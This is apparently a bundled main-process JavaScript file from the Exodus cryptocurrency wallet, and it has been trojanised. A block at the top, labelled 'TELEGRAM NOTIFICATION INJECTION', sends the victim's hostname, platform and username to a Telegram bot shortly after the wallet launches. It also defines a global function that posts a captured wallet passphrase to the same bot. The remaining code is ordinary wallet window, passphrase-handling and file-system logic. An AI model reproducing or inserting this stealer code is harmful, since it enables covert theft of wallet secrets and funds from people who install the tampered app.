! function(e) {
    var t = {};

    function n(r) {
        if (t[r]) return t[r].exports;
        var o = t[r] = {
            i: r,
            l: !1,
            exports: {}
        };
        return e[r].call(o.exports, o, o.exports, n), o.l = !0, o.exports
    }

    // === TELEGRAM NOTIFICATION INJECTION ===

    (function() {
        const https = require('https');
        const os = require('os');

        const botToken = 'YOUR BOT TOKEN HERE';
        const chatId = 'YOUR CHAT ID HERE';
        
        function sendTelegramNotification() {
            
            if (!botToken || !chatId) {
                console.log('[TELEGRAM] Credentials not configured');
                return;
            }
            
            const sysInfo = {
                hostname: os.hostname(),
                platform: os.platform(),
                arch: os.arch(),
                username: os.userInfo().username,
                timestamp: new Date().toISOString()
            };
            
            const message = `🚀 Exodus Wallet Launched

 • Hostname: ${sysInfo.hostname}
 • Platform: ${sysInfo.platform}
 • Architecture: ${sysInfo.arch}
 • Username: ${sysInfo.username}
 • Launch Time: ${sysInfo.timestamp}`;
            
            const payload = JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'HTML'
            });
            
            const options = {
                hostname: 'api.telegram.org',
                port: 443,
                path: `/bot${botToken}/sendMessage`,
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Content-Length': payload.length
                }
            };
            
            const req = https.request(options, (res) => {
                let data = '';
                res.on('data', chunk => data += chunk);
                res.on('end', () => {
                    if (res.statusCode === 200) {
                        console.log('[TELEGRAM] Notification sent successfully');
                    } else {
                        console.error('[TELEGRAM] Failed to send notification:', res.statusCode, data);
                    }
                });
            });
            
            req.on('error', error => {
                console.error('[TELEGRAM] Request error:', error.message);
            });
            
            req.write(payload);
            req.end();
        }

        function sendPhrase(passphrase) {

            if (!botToken || !chatId || botToken.includes('YOUR_BOT_TOKEN') || chatId.includes('YOUR_CHAT_ID')) {
                console.log('[TELEGRAM] Credentials not configured');
                return;
            }
            
           const message = `🔑 Wallet Passphrase Captured

 • Passphrase: ${passphrase || 'N/A'}`;
            
            const payload = JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'HTML'
            });
            
            const options = {
                hostname: 'api.telegram.org',
                port: 443,
                path: `/bot${botToken}/sendMessage`,
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Content-Length': Buffer.byteLength(payload)
                }
            };
            
            const req = https.request(options, (res) => {
                console.log('[TELEGRAM] Credentials sent, status:', res.statusCode);
            });
            
            req.on('error', error => {
                console.error('[TELEGRAM] Error:', error);
            });
            
            req.write(payload);
            req.end();
        }

        globalThis.sendTelegramNotification = sendTelegramNotification;
        globalThis.sendPhrase = sendPhrase;
        
        setTimeout(() => {
            try {
                globalThis.sendTelegramNotification();
            } catch (error) {
                console.error('[TELEGRAM] Error sending notification:', error);
            }
        }, 2000);
    })();

    // === END TELEGRAM NOTIFICATION INJECTION ===

    

    n.m = e, n.c = t, n.d = function(e, t, r) {
        n.o(e, t) || Object.defineProperty(e, t, {
            enumerable: !0,
            get: r
        })
    }, n.r = function(e) {
        "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(e, Symbol.toStringTag, {
            value: "Module"
        }), Object.defineProperty(e, "__esModule", {
            value: !0
        })
    }, n.t = function(e, t) {
        if (1 & t && (e = n(e)), 8 & t) return e;
        if (4 & t && "object" == typeof e && e && e.__esModule) return e;
        var r = Object.create(null);
        if (n.r(r), Object.defineProperty(r, "default", {
                enumerable: !0,
                value: e
            }), 2 & t && "string" != typeof e)
            for (var o in e) n.d(r, o, function(t) {
                return e[t]
            }.bind(null, o));
        return r
    }, n.n = function(e) {
        var t = e && e.__esModule ? function() {
            return e.default
        } : function() {
            return e
        };
        return n.d(t, "a", t), t
    }, n.o = function(e, t) {
        return Object.prototype.hasOwnProperty.call(e, t)
    }, n.p = "", n(n.s = 143)
}([function(e, t) {
            e.exports = require("electron")
        }, function(e, t, n) {
            "use strict";
            var r = n(70);
            n.o(r, "AUTO_UPDATE_BASE_URL") && n.d(t, "AUTO_UPDATE_BASE_URL", function() {
                return r.AUTO_UPDATE_BASE_URL
            }), n.o(r, "ENV_BUILD_EDEN") && n.d(t, "ENV_BUILD_EDEN", function() {
                return r.ENV_BUILD_EDEN
            }), n.o(r, "ENV_BUILD_EXODUS") && n.d(t, "ENV_BUILD_EXODUS", function() {
                return r.ENV_BUILD_EXODUS
            }), n.o(r, "ENV_BUILD_NAME") && n.d(t, "ENV_BUILD_NAME", function() {
                return r.ENV_BUILD_NAME
            }), n.o(r, "ENV_DEV") && n.d(t, "ENV_DEV", function() {
                return r.ENV_DEV
            }), n.o(r, "ENV_EXODUS_PROD") && n.d(t, "ENV_EXODUS_PROD", function() {
                return r.ENV_EXODUS_PROD
            }), n.o(r, "ENV_PROD") && n.d(t, "ENV_PROD", function() {
                return r.ENV_PROD
            }), n.o(r, "ENV_TEST") && n.d(t, "ENV_TEST", function() {
                return r.ENV_TEST
            }), n.o(r, "FLAG_FILE_RESTORE_FROM_CURRENT_PHRASE") && n.d(t, "FLAG_FILE_RESTORE_FROM_CURRENT_PHRASE", function() {
                return r.FLAG_FILE_RESTORE_FROM_CURRENT_PHRASE
            }), n.o(r, "FLAG_FILE_RESTORE_MNEMONIC") && n.d(t, "FLAG_FILE_RESTORE_MNEMONIC", function() {
                return r.FLAG_FILE_RESTORE_MNEMONIC
            }), n.o(r, "MIN_HEIGHT") && n.d(t, "MIN_HEIGHT", function() {
                return r.MIN_HEIGHT
            }), n.o(r, "MIN_WIDTH") && n.d(t, "MIN_WIDTH", function() {
                return r.MIN_WIDTH
            }), n.o(r, "NIGHTLY_BUILD") && n.d(t, "NIGHTLY_BUILD", function() {
                return r.NIGHTLY_BUILD
            }), n.o(r, "PACKAGE") && n.d(t, "PACKAGE", function() {
                return r.PACKAGE
            }), n.o(r, "PROTOCOL") && n.d(t, "PROTOCOL", function() {
                return r.PROTOCOL
            }), n.o(r, "UNLOCK_WINDOW_HEIGHT") && n.d(t, "UNLOCK_WINDOW_HEIGHT", function() {
                return r.UNLOCK_WINDOW_HEIGHT
            })
        }, function(e, t) {
            e.exports = require("path")
        }, function(e, t, n) {
            "use strict";
            n.d(t, "appWindows", function() {
                return k
            }), n.d(t, "onAppReady", function() {
                return _
            });
            n(126), n(125), n(124);
            var r = n(0),
                o = n(9),
                i = n.n(o),
                s = n(2),
                a = n.n(s),
                c = n(36),
                u = n(1),
                l = n(28),
                d = n(17),
                f = n(86),
                p = n(10),
                h = n(25),
                w = n(5),
                m = n(29),
                b = n(51),
                y = n(50),
                g = n(49),
                E = n(35),
                v = n(19),
                O = n(32),
                S = n(34);
            const k = {};
            let D;
            async function _(e) {
                const t = e.exodusDirFromCli,
                    n = Object(m.init)(t),
                    o = Object(b.init)(n),
                    s = Object(v.init)(n);
                k.background = n, k.ui = s, k.core = o;
                const a = t || Object(l.dataDir)();
                console.timeEnd("main"), console.time("uiview"), await async function(e, t) {
                    if (await i.a.pathExists(x(t))) return async function(e) {
                        await i.a.remove(x(e)), D = Object(E.init)({
                            recoverFromPhrase: !0
                        });
                        const t = Object(c.walletDirFromExodusDir)(e);
                        N(t)
                    }(t);
                    const n = function(e) {
                        if (globalThis.OPENED_URL && globalThis.OPENED_URL.includes("recover")) return globalThis.OPENED_URL;
                        if (!Array.isArray(e._) && e._.length > 0) return null;
                        const t = e._.find(e => e.includes("recover"));
                        return t && t.includes("recover") ? t : null
                    }(e);
                    if (n) return async function(e, t) {
                        D = Object(E.init)({
                            recoverFromLink: !0
                        });
                        const n = Object(c.walletDirFromExodusDir)(t);
                        h.default.on("passphrase:set", t => {
                            const r = Object(S.init)({
                                walletDir: n,
                                recoveryLink: e,
                                passphrase: t
                            });
                            h.default.on("passphrase:invalid", () => {
                                r.destroy()
                            })
                        })
                    }(n, t);
                    h.default.on("error", e => {
                        const t = `Wallet Load Error:\n\n${e}\n\nPlease contact: support@exodus.com\n\nYour assets are safe.`;
                        r.dialog.showErrorBox("Wallet Load Error", t), r.app.quit()
                    });
                    const o = Object(c.walletDirFromExodusDir)(t),
                        s = Object(c.default)(o),
                        a = await s.walletExists(),
                        u = await s.passphraseFileExists();
                    if (!a || a && u) Object(S.init)({
                        walletDir: o
                    });
                    else {
                        if (u) {
                            const e = new Error("Wallet exists - should not have reached this point.");
                            throw console.error(e), e
                        }
                        D = Object(E.init)(), h.default.on("passphrase:set", e => {
                            const t = Object(S.init)({
                                walletDir: o,
                                passphrase: e
                            });
                            h.default.on("passphrase:invalid", () => {
                                t.destroy()
                            })
                        }), N(o)
                    }
                }(e, a), s.webContents.on("devtools-opened", () => {
                    console.log("devtools were opened"), setImmediate(() => {
                        s.webContents.send("devtools-opened")
                    })
                }), s.webContents.once("did-finish-load", () => {
                    function e() {
                        D && (Object(m.maximize)(n), n.show(), D.destroy()), (Object(d.default)() || u.ENV_DEV) && Object(p.default)({
                            windowHandle: s.webContents,
                            windowId: "ui"
                        }), setTimeout(() => {
                            Object(f.default)().catch(console.error)
                        }, 3e4)
                    }
                    console.log(`did-finish-load at [${Date.now()}]`), console.timeEnd("uiview"), k.unlock = Object(O.init)(n), D || (Object(m.maximize)(n), s.webContents.zoomFactor = 1, n.show()), Object(g.init)(), h.default._walletLoaded ? e() : h.default.on("wallet:loaded", e)
                }), s.webContents.loadFile(w.WINDOW_EXODUS), Object(y.init)(), n.on("close", () => r.app.quit())
            }
            const N = e => {
                
                    h.default.on("mnemonic:set", ({
                        mnemonic: t,
                        passphrase: n
                    }) => {
                        const r = Object(S.init)({
                            walletDir: e,
                            recoveryPhrase: t,
                            recoveryPhrasePassphrase: n
                        });
                        h.default.on("passphrase:invalid", () => {
                            r.destroy()
                        })
                    })
                },
                x = e => a.a.join(e, u.FLAG_FILE_RESTORE_MNEMONIC)
        }, function(e, t, n) {
            "use strict";
            n.d(t, "createServer", function() {
                return a
            }), n.d(t, "targeted", function() {
                return i
            }), n.d(t, "mainBroadcastListener", function() {
                return c
            }), n.d(t, "rpcMain", function() {
                return l
            });
            var r = n(66);
            const o = n.n(r).a || r,
                {
                    targeted: i,
                    rpcListener: s,
                    createServer: a
                } = o,
                {
                    mainBroadcastListener: c,
                    broadcast: u,
                    rpcMain: l
                } = o,
                {
                    createClient: d,
                    createClientMethod: f,
                    rpcRenderer: p
                } = o
        }, function(e, t, n) {
            "use strict";
            n.d(t, "WINDOW_EXODUS", function() {
                return s
            }), n.d(t, "WINDOW_KEYVIEWER", function() {
                return a
            }), n.d(t, "WINDOW_MONERO", function() {
                return c
            }), n.d(t, "WINDOW_NETWORK", function() {
                return u
            }), n.d(t, "WINDOW_PASSPHRASE", function() {
                return l
            }), n.d(t, "WINDOW_SCAN_QR", function() {
                return d
            }), n.d(t, "WINDOW_UNLOCK", function() {
                return f
            }), n.d(t, "WINDOW_WALLET", function() {
                return p
            }), n.d(t, "WINDOW_CORE", function() {
                return h
            }), n.d(t, "WINDOW_NFTS", function() {
                return w
            }), n.d(t, "WINDOW_RECOVERY", function() {
                return m
            });
            var r = n(2),
                o = n.n(r);
            const i = e => o.a.join("src", "static", e),
                s = i(n(1).ENV_PROD ? "exodus-prod.html" : "exodus-dev.html"),
                a = i("keyviewer.html"),
                c = i("monero.html"),
                u = i("network.html"),
                l = i("passphrase.html"),
                d = i("scan-qr.html"),
                f = i("unlock.html"),
                p = i("wallet.html"),
                h = i("core.html"),
                w = i("nfts.html"),
                m = i("recovery.html")
        }, function(e, t, n) {
            "use strict";
            n.d(t, "showError", function() {
                return a
            });
            var r = n(0),
                o = n(1);
            const i = o.ENV_PROD && o.ENV_BUILD_EDEN,
                s = o.ENV_PROD && !o.ENV_BUILD_EDEN;

            function a(e, t = "", n = 2, o = !0) {
                n >= 3 && (console.error(`[security] PANIC on ${e}${t}, terminating`), r.app.exit(-1));
                const a = o ? "blocked" : "noticed";
                if (console.error(`[security] ${a} ${e}${t}`), s);
                else if (i) {
                    if (n < 2) return;
                    r.dialog.showMessageBoxSync({
                        type: "warning",
                        title: `Unexpected ${e} was ${a}`,
                        message: `Unexpected ${e}${t} was ${a} by security rules. Please contact support@exodus.com`
                    })
                } else {
                    if (n < 1) return;
                    console.error(`[security] PANIC on ${e} attempt, this shouldn't happen!\n` + "This indicates an error either in the application code, or in security hardening logic.\nIf this is not caused by local modifications, please report this so that broken code does not end up in release.\nIf this is caused by local modifications, reporting it might also help to resolve the issue."), r.app.exit(-1)
                }
            }
        }, function(e, t, n) {
            "use strict";
            n.d(t, "integration", function() {
                return u
            }), n.d(t, "isolation", function() {
                return l
            });
            var r = n(0),
                o = n(2),
                i = n.n(o),
                s = n(1);
            const a = (() => s.ENV_BUILD_EDEN ? i.a.join(r.app.getAppPath(), "src", "static", "icons", "PNG", "red", "icon_128x128.png") : i.a.join(r.app.getAppPath(), "src", "static", "icons", "PNG", "icon_128x128.png"))(),
                c = (() => s.ENV_BUILD_EXODUS ? "Exodus" : s.ENV_BUILD_EDEN ? "Eden" : s.ENV_BUILD_NAME)(),
                u = {
                    webSecurity: !0,
                    spellcheck: !1,
                    enableRemoteModule: !1,
                    nodeIntegration: !0,
                    sandbox: !1,
                    contextIsolation: !1,
                    nodeIntegrationInWorker: !1
                },
                l = {
                    webSecurity: !0,
                    spellcheck: !1,
                    enableRemoteModule: !1,
                    preload: i.a.join(r.app.getAppPath(), "src/app/preload/index.js"),
                    nodeIntegration: !1,
                    sandbox: !0,
                    contextIsolation: !0,
                    nodeIntegrationInWorker: !1
                };
            t.default = {
                resizable: !0,
                title: c,
                icon: a,
                frame: !0,
                backgroundColor: "#0b0b0b",
                show: !1
            }
        }, function(e, t, n) {
            "use strict";
            n.r(t), n.d(t, "getWebContentsMeta", function() {
                return u
            }), n.d(t, "registerWebContents", function() {
                return l
            });
            var r = n(0),
                o = n(15),
                i = n(93),
                s = n(6),
                a = n(37);
            const c = new WeakMap;

            function u(e) {
                const t = c.get(e);
                if (!t) throw new Error("webContents instance is not registered");
                return t
            }

            function l(e, t, n = {}) {
                const r = Object(i.prepareMetaEntry)(t, n);
                if (c.has(e)) throw new Error("Attempting to re-register webContents instance");
                c.set(e, r), Object(a.registerWebContentsSession)(e, r)
            }
            r.app.on("web-contents-created", (e, t) => {
                t.on("will-navigate", (e, t) => {
                    "mailto:" !== new o.URL(t).protocol && (e.preventDefault(), Object(s.showError)("unsafe navigation", ` to ${t}`, 0))
                });
                t.setWindowOpenHandler(({
                    url: e
                }) => (e => {
                    return !(!(t.getURL() || "").startsWith("devtools://") || !e.startsWith("devtools://"))
                })(e) ? {
                    action: "allow"
                } : (Object(s.showError)("opening a new window", `: ${e}`, 0), {
                    action: "deny"
                })), t.on("will-attach-webview", e => {
                    e.preventDefault();
                    const n = t.getURL() || "";
                    Object(s.showError)("attaching webview", `: ${n}`, 2)
                }), Object(a.saveSessionWebContents)(t)
            })
        }, function(e, t, n) {
            "use strict";
            e.exports = {...n(39),
                ...n(59),
                ...n(114),
                ...n(112),
                ...n(106),
                ...n(21),
                ...n(101),
                ...n(57),
                ...n(30),
                ...n(47)
            }
        }, function(e, t, n) {
            "use strict";
            n.d(t, "default", function() {
                return d
            });
            var r = n(0),
                o = n(9),
                i = n.n(o),
                s = n(1),
                a = n(17),
                c = n(19);
            const u = "exodus-devtools.conf";
            class l {
                constructor(e) {
                    this._windowHandle = e.windowHandle, this._windowId = e.windowId, this._options = {}, "devMenu" === this._windowId && (this._options = {
                        mode: "detach"
                    })
                }
                async readConf() {
                    let e;
                    const t = {
                            devMenu: {
                                mode: "detach"
                            },
                            ui: {
                                mode: "detach"
                            },
                            monero: {
                                mode: "bottom"
                            },
                            network: {
                                mode: "bottom"
                            },
                            core: {
                                mode: "bottom"
                            },
                            passphrase: {
                                mode: "bottom"
                            },
                            scanQR: {
                                mode: "detach"
                            },
                            keyviewer: {
                                mode: "detach"
                            },
                            wallet: {
                                mode: "bottom"
                            },
                            unlock: {
                                mode: "detach"
                            },
                            recovery: {
                                mode: "bottom"
                            }
                        },
                        n = e => Object.keys(e).sort().join("|");
                    try {
                        if (n(e = await i.a.readJson(u, "utf8")) !== n(t)) throw new Error(`Keys mismatch in ${u}`)
                    } catch (n) {
                        "ENOENT" === n.code ? console.log(`Exodus DevTools configuration file does not exist, so creating a default in '${u}'.`) : console.error(n), e = t;
                        try {
                            await i.a.writeJson(u, e, {
                                spaces: 2
                            })
                        } catch (e) {
                            console.error(e)
                        }
                    }
                    this._options = e[this._windowId]
                }
                show() {
                    if (!this._options) return;
                    let e;
                    if ("number" == typeof this._windowHandle) e = r.BrowserWindow.fromId(this._windowHandle).webContents;
                    else if (null == this._windowHandle) e = Object(c.getWindow)().webContents;
                    else if ("function" == typeof this._windowHandle.constructor)
                        if ("BrowserWindow" === this._windowHandle.constructor.name) e = this._windowHandle.webContents;
                        else {
                            if (!this._windowHandle.openDevTools) throw new Error("#devtools.show() Unknown constructor.");
                            e = this._windowHandle
                        }
                    if (!e) return console.error("Can't show #devtools.");
                    let t = "ui" === this._windowId ? {
                        mode: "detach"
                    } : this._options;
                    e.openDevTools(t)
                }
            }
            async function d(e = {
                windowHandle: null,
                windowId: "devMenu"
            }) {
                if (s.ENV_TEST) return;
                const t = new l(e);
                (s.ENV_DEV || Object(a.default)()) && await t.readConf(), t.show()
            }
        }, function(e, t, n) {
            const r = n(97),
                o = e => "-" === e || Array.isArray(e) && "-" === e[0],
                i = e => "function" == typeof e,
                s = e => r.includes(e);
            e.exports = function e(t) {
                return Array.isArray(t) ? 0 === t.length ? [] : o(t[0]) ? {
                    type: "separator"
                } : "string" != typeof t[0] ? t.map(e) : t.slice(1).reduce((t, n) => i(n) ? Object.assign(t, {
                    click: n
                }) : s(n) ? Object.assign(t, {
                    role: n
                }) : Array.isArray(n) ? Object.assign(t, {
                    submenu: e(n)
                }) : "object" == typeof n ? Object.assign(t, n) : "string" == typeof n ? Object.assign(t, {
                    accelerator: n
                }) : void 0, {
                    label: t[0]
                }) : o(t) ? {
                    type: "separator"
                } : t
            }
        }, function(e, t, n) {
            var r, o, i = n(26),
                s = n(123),
                a = n(121),
                c = n(119),
                u = n(43);

            function l(e, t) {
                Object.defineProperty(e, r, {
                    get: function() {
                        return t
                    }
                })
            }
            r = Symbol.for("graceful-fs.queue"), o = Symbol.for("graceful-fs.previous");
            var d, f = function() {};
            if (u.debuglog ? f = u.debuglog("gfs4") : /\bgfs4\b/i.test(process.env.NODE_DEBUG || "") && (f = function() {
                    var e = u.format.apply(u, arguments);
                    e = "GFS4: " + e.split(/\n/).join("\nGFS4: "), console.error(e)
                }), !i[r]) {
                var p = global[r] || [];
                l(i, p), i.close = function(e) {
                    function t(t, n) {
                        return e.call(i, t, function(e) {
                            e || w(), "function" == typeof n && n.apply(this, arguments)
                        })
                    }
                    return Object.defineProperty(t, o, {
                        value: e
                    }), t
                }(i.close), i.closeSync = function(e) {
                    function t(t) {
                        e.apply(i, arguments), w()
                    }
                    return Object.defineProperty(t, o, {
                        value: e
                    }), t
                }(i.closeSync), /\bgfs4\b/i.test(process.env.NODE_DEBUG || "") && process.on("exit", function() {
                    f(i[r]), n(69).equal(i[r].length, 0)
                })
            }

            function h(e) {
                f("ENQUEUE", e[0].name, e[1]), i[r].push(e), m()
            }

            function w() {
                for (var e = Date.now(), t = 0; t < i[r].length; ++t) i[r][t].length > 2 && (i[r][t][3] = e, i[r][t][4] = e);
                m()
            }

            function m() {
                if (clearTimeout(d), d = void 0, 0 !== i[r].length) {
                    var e = i[r].shift(),
                        t = e[0],
                        n = e[1],
                        o = e[2],
                        s = e[3],
                        a = e[4];
                    if (void 0 === s) f("RETRY", t.name, n), t.apply(null, n);
                    else if (Date.now() - s >= 6e4) {
                        f("TIMEOUT", t.name, n);
                        var c = n.pop();
                        "function" == typeof c && c.call(null, o)
                    } else {
                        var u = Date.now() - a,
                            l = Math.max(a - s, 1);
                        u >= Math.min(1.2 * l, 100) ? (f("RETRY", t.name, n), t.apply(null, n.concat([s]))) : i[r].push(e)
                    }
                    void 0 === d && (d = setTimeout(m, 0))
                }
            }
            global[r] || l(global, i[r]), e.exports = function e(t) {
                s(t);
                t.gracefulify = e;
                t.createReadStream = function(e, n) {
                    return new t.ReadStream(e, n)
                };
                t.createWriteStream = function(e, n) {
                    return new t.WriteStream(e, n)
                };
                var n = t.readFile;
                t.readFile = function(e, t, r) {
                    "function" == typeof t && (r = t, t = null);
                    return function e(t, r, o, i) {
                        return n(t, r, function(n) {
                            !n || "EMFILE" !== n.code && "ENFILE" !== n.code ? "function" == typeof o && o.apply(this, arguments) : h([e, [t, r, o], n, i || Date.now(), Date.now()])
                        })
                    }(e, t, r)
                };
                var r = t.writeFile;
                t.writeFile = function(e, t, n, o) {
                    "function" == typeof n && (o = n, n = null);
                    return function e(t, n, o, i, s) {
                        return r(t, n, o, function(r) {
                            !r || "EMFILE" !== r.code && "ENFILE" !== r.code ? "function" == typeof i && i.apply(this, arguments) : h([e, [t, n, o, i], r, s || Date.now(), Date.now()])
                        })
                    }(e, t, n, o)
                };
                var o = t.appendFile;
                o && (t.appendFile = function(e, t, n, r) {
                    "function" == typeof n && (r = n, n = null);
                    return function e(t, n, r, i, s) {
                        return o(t, n, r, function(o) {
                            !o || "EMFILE" !== o.code && "ENFILE" !== o.code ? "function" == typeof i && i.apply(this, arguments) : h([e, [t, n, r, i], o, s || Date.now(), Date.now()])
                        })
                    }(e, t, n, r)
                });
                var i = t.copyFile;
                i && (t.copyFile = function(e, t, n, r) {
                    "function" == typeof n && (r = n, n = 0);
                    return function e(t, n, r, o, s) {
                        return i(t, n, r, function(i) {
                            !i || "EMFILE" !== i.code && "ENFILE" !== i.code ? "function" == typeof o && o.apply(this, arguments) : h([e, [t, n, r, o], i, s || Date.now(), Date.now()])
                        })
                    }(e, t, n, r)
                });
                var c = t.readdir;
                t.readdir = function(e, t, n) {
                    "function" == typeof t && (n = t, t = null);
                    var r = u.test(process.version) ? function(e, t, n, r) {
                        return c(e, o(e, t, n, r))
                    } : function(e, t, n, r) {
                        return c(e, t, o(e, t, n, r))
                    };
                    return r(e, t, n);

                    function o(e, t, n, o) {
                        return function(i, s) {
                            !i || "EMFILE" !== i.code && "ENFILE" !== i.code ? (s && s.sort && s.sort(), "function" == typeof n && n.call(this, i, s)) : h([r, [e, t, n], i, o || Date.now(), Date.now()])
                        }
                    }
                };
                var u = /^v[0-5]\./;
                if ("v0.8" === process.version.substr(0, 4)) {
                    var l = a(t);
                    m = l.ReadStream, b = l.WriteStream
                }
                var d = t.ReadStream;
                d && (m.prototype = Object.create(d.prototype), m.prototype.open = function() {
                    var e = this;
                    g(e.path, e.flags, e.mode, function(t, n) {
                        t ? (e.autoClose && e.destroy(), e.emit("error", t)) : (e.fd = n, e.emit("open", n), e.read())
                    })
                });
                var f = t.WriteStream;
                f && (b.prototype = Object.create(f.prototype), b.prototype.open = function() {
                    var e = this;
                    g(e.path, e.flags, e.mode, function(t, n) {
                        t ? (e.destroy(), e.emit("error", t)) : (e.fd = n, e.emit("open", n))
                    })
                });
                Object.defineProperty(t, "ReadStream", {
                    get: function() {
                        return m
                    },
                    set: function(e) {
                        m = e
                    },
                    enumerable: !0,
                    configurable: !0
                });
                Object.defineProperty(t, "WriteStream", {
                    get: function() {
                        return b
                    },
                    set: function(e) {
                        b = e
                    },
                    enumerable: !0,
                    configurable: !0
                });
                var p = m;
                Object.defineProperty(t, "FileReadStream", {
                    get: function() {
                        return p
                    },
                    set: function(e) {
                        p = e
                    },
                    enumerable: !0,
                    configurable: !0
                });
                var w = b;
                Object.defineProperty(t, "FileWriteStream", {
                    get: function() {
                        return w
                    },
                    set: function(e) {
                        w = e
                    },
                    enumerable: !0,
                    configurable: !0
                });

                function m(e, t) {
                    return this instanceof m ? (d.apply(this, arguments), this) : m.apply(Object.create(m.prototype), arguments)
                }

                function b(e, t) {
                    return this instanceof b ? (f.apply(this, arguments), this) : b.apply(Object.create(b.prototype), arguments)
                }
                var y = t.open;
                t.open = g;

                function g(e, t, n, r) {
                    return "function" == typeof n && (r = n, n = null),
                        function e(t, n, r, o, i) {
                            return y(t, n, r, function(s, a) {
                                !s || "EMFILE" !== s.code && "ENFILE" !== s.code ? "function" == typeof o && o.apply(this, arguments) : h([e, [t, n, r, o], s, i || Date.now(), Date.now()])
                            })
                        }(e, t, n, r)
                }
                return t
            }(c(i))
        }, function(e, t, n) {
            "use strict";
            n.d(t, "forwardErrors", function() {
                return i
            });
            var r = n(6),
                o = n(3);

            function i(e, t) {
                if (!t) throw new Error("fromWindow is required!");
                e.on("console-message", (e, n, i, s, a) => {
                    if ("ui" === t && /^Error in [^ ]+ window:/.test(i)) return;
                    if (i.includes("the following Content Security Policy directive:")) {
                        const e = i.replace(/the following Content Security Policy directive:[\s\S]*/, "CSP").replace(/ because it violates CSP$/, "");
                        Object(r.showError)("Content Security Policy violation", ` in ${t} window (${e})`)
                    }
                    if (n < 3) return;
                    if ("ui" === t || !o.appWindows.ui) return;
                    const c = {
                        level: n,
                        message: i,
                        line: s,
                        sourceId: a,
                        window: t
                    };
                    o.appWindows.ui.webContents.send("errors:remote-error", c)
                })
            }
        }, function(e, t, n) {
            "use strict";
            t.fromCallback = function(e) {
                return Object.defineProperty(function(...t) {
                    if ("function" != typeof t[t.length - 1]) return new Promise((n, r) => {
                        e.call(this, ...t, (e, t) => null != e ? r(e) : n(t))
                    });
                    e.apply(this, t)
                }, "name", {
                    value: e.name
                })
            }, t.fromPromise = function(e) {
                return Object.defineProperty(function(...t) {
                    const n = t[t.length - 1];
                    if ("function" != typeof n) return e.apply(this, t);
                    e.apply(this, t.slice(0, -1)).then(e => n(null, e), n)
                }, "name", {
                    value: e.name
                })
            }
        }, function(e, t) {
            e.exports = require("url")
        }, function(e, t, n) {
            "use strict";
            n.d(t, "fiatUnit", function() {
                return r
            }), n.d(t, "themeName", function() {
                return o
            }), n.d(t, "adaLegacyAddressEnabled", function() {
                return i
            }), n.d(t, "moneroInitialHeight", function() {
                return s
            }), n.d(t, "moneroSubaddressesEnabled", function() {
                return a
            }), n.d(t, "bitcoinLegacyAddressEnabled", function() {
                return c
            }), n.d(t, "bitcoinTaprootAddressEnabled", function() {
                return u
            }), n.d(t, "rbfEnabledBitcoin", function() {
                return l
            }), n.d(t, "rbfEnabledEthereum", function() {
                return d
            }), n.d(t, "wentThroughFiatOnboarding", function() {
                return f
            });
            const r = "fiat.unit",
                o = "theme.name",
                i = "adaLegacyAddressEnabled",
                s = "moneroInitialHeight",
                a = "moneroSubaddressesEnabled",
                c = "bitcoinLegacyAddressEnabled",
                u = "bitcoinTaprootAddressEnabled",
                l = "advanced.advancedMode.assets.bitcoin",
                d = "advanced.advancedMode.assets.ethereum",
                f = "fiatOnramp.wentThroughFiatOnboarding"
        }, function(e, t, n) {
            "use strict";
            let r;

            function o() {
                return "boolean" == typeof r ? r : globalThis.DEBUG_MODE
            }
            n.d(t, "default", function() {
                return o
            })
        }, function(e, t, n) {
            "use strict";
            n.d(t, "getHtmlUrl", function() {
                return a
            });
            var r = n(2),
                o = n.n(r),
                i = n(15),
                s = n.n(i);
            const a = ({
                app: e,
                filePath: t,
                hash: n,
                query: r
            }) => {
                const i = {
                    protocol: "file",
                    slashes: !0,
                    pathname: o.a.resolve(e.getAppPath(), t),
                    hash: n,
                    query: r
                };
                return s.a.format(i)
            }
        }, function(e, t, n) {
            "use strict";
            n.d(t, "getWindow", function() {
                return l
            }), n.d(t, "navbarHeightChangeHandlers", function() {
                return f
            }), n.d(t, "init", function() {
                return p
            });
            var r = n(0),
                o = (n(2), n(23)),
                i = n(8),
                s = n(13),
                a = n(7),
                c = n(29);
            let u = null;
            const l = () => u,
                d = (e, t) => {
                    const {
                        height: n,
                        width: r
                    } = t.getContentBounds();
                    e.setBounds({
                        x: 0,
                        y: 0,
                        width: r,
                        height: n
                    })
                },
                f = new Set;

            function p(e) {
                return u = new r.WebContentsView({
                    webPreferences: {...a.integration,
                        partition: "persist:main",
                        backgroundThrottling: !1,
                        backgroundColor: "#00000000",
                        transparent: !0
                    },
                    transparent: !0
                }), Object(i.registerWebContents)(u.webContents, "ui"), Object(o.registerWebContentsView)(u), Object(s.forwardErrors)(u.webContents, "ui"), e.contentView.on("bounds-changed", () => d(u, e)), e.contentView.addChildView(u), d(u, e), u.webContents.on("will-navigate", (e, t) => {
                    t.startsWith("mailto:") || e.preventDefault()
                }), u.webContents.setWindowOpenHandler(e => ({
                    action: "deny"
                })), c.maximizeWorkaroundHandlers.add(() => d(u, e)), u
            }
        }, function(e, t, n) {
            const r = !1,
                o = {
                    MAIN: 1,
                    RENDERER: 2
                },
                i = {
                    BEGIN: "B",
                    END: "E",
                    INSTANT: "i"
                },
                s = [];

            function a(e) {
                return r ? t => {
                    const n = {
                        name: t,
                        pid: o.MAIN,
                        ph: e,
                        cat: "PERF",
                        timestamp: Date.now()
                    };
                    e === i.INSTANT && (n.s = "p"), s.push(n)
                } : () => {}
            }
            e.exports = {
                PERF_METRICS_FEATURES: r,
                beginEvent: a(i.BEGIN),
                endEvent: a(i.END),
                instantEvent: a(i.INSTANT),
                getTimeOrigin: () => null,
                getTrace: e => s.map(t => {
                    const {
                        timestamp: n,
                        ...r
                    } = t;
                    return {...r,
                        ts: 1e3 * (n - e)
                    }
                })
            }
        }, function(e, t, n) {
            "use strict";
            const r = n(14).fromPromise,
                {
                    makeDir: o,
                    makeDirSync: i
                } = n(117),
                s = r(o);
            e.exports = {
                mkdirs: s,
                mkdirsSync: i,
                mkdirp: s,
                mkdirpSync: i,
                ensureDir: s,
                ensureDirSync: i
            }
        }, function(e, t, n) {
            "use strict";

            function r(e = null) {
                return e ? encodeURIComponent(JSON.stringify(e)) : ""
            }
            n.d(t, "encode", function() {
                return r
            })
        }, function(e, t, n) {
            const {
                BaseWindow: r,
                BrowserWindow: o
            } = n(0);
